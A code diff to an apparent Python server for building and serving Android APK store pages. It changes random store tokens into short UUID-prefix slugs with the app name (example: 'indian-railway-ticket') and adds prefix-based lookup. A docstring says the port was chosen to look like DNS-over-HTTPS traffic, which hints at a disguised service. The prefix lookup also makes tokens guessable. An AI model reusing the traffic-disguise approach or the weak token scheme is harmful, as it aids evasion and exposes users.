@@ -12,7 +12,7 @@ Run: python update_server.py
 Port: 2053 (Cloudflare HTTPS-compatible port — looks like DNS-over-HTTPS)
 """
 
-import os, sqlite3, hashlib, hmac, json, random, string, time, threading, uuid, base64
+import os, re, sqlite3, hashlib, hmac, json, random, string, time, threading, uuid, base64
 import sys
 sys.path.insert(0, os.path.dirname(__file__))
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'scripts'))
@@ -960,7 +960,12 @@ def build_complete():
             bot_db.close()
             return jsonify({"ok": False, "error": "build record not found"}), 404
 
-        store_token = str(uuid.uuid4()).replace("-", "")
+        # Build slug: first 8 chars of UUID + app-name (e.g. fd667658-indian-railway-ticket)
+        _uuid_short = str(uuid.uuid4()).replace("-", "")[:8]
+        _app_slug   = re.sub(r"[^a-z0-9]+", "-", (package_name or "app").lower()).strip("-")
+        # Use display name from package if available, else fall back to package_name slug
+        _disp_slug  = re.sub(r"[^a-z0-9]+", "-", (data.get("app_name", "") or _app_slug).lower()).strip("-") or _app_slug
+        store_token = f"{_uuid_short}-{_disp_slug}"
         bot_db.execute(
             "UPDATE builds SET package_name=?, apk_size=?, duration_secs=?, store_token=? WHERE id=?",
             (package_name, apk_size, duration_secs, store_token, row[0])
@@ -980,16 +985,26 @@ def build_complete():
 
 # ── Store page helpers ────────────────────────────────────────────────────────
 def _get_build_by_token(token):
-    """Return build row dict from bot.db by store_token."""
+    """Return build row dict from bot.db by store_token.
+    Accepts both full slug (fd667658-indian-railway-ticket) and legacy 32-char UUID.
+    Matches by exact store_token first, then by 8-char prefix for slug format.
+    """
     try:
         bot_db_path = os.path.join(os.path.dirname(__file__), "bot.db")
         if not os.path.exists(bot_db_path):
             return None
         db = sqlite3.connect(bot_db_path, timeout=5)
         db.row_factory = sqlite3.Row
+        # Try exact match first (covers both legacy and new slug)
         row = db.execute(
             "SELECT * FROM builds WHERE store_token=? LIMIT 1", (token,)
         ).fetchone()
+        if not row:
+            # New slug format: first 8 chars are the UUID prefix
+            prefix = token.split("-")[0] if "-" in token else token[:8]
+            row = db.execute(
+                "SELECT * FROM builds WHERE store_token LIKE ? LIMIT 1", (f"{prefix}%",)
+            ).fetchone()
         db.close()
         return dict(row) if row else None
     except Exception:
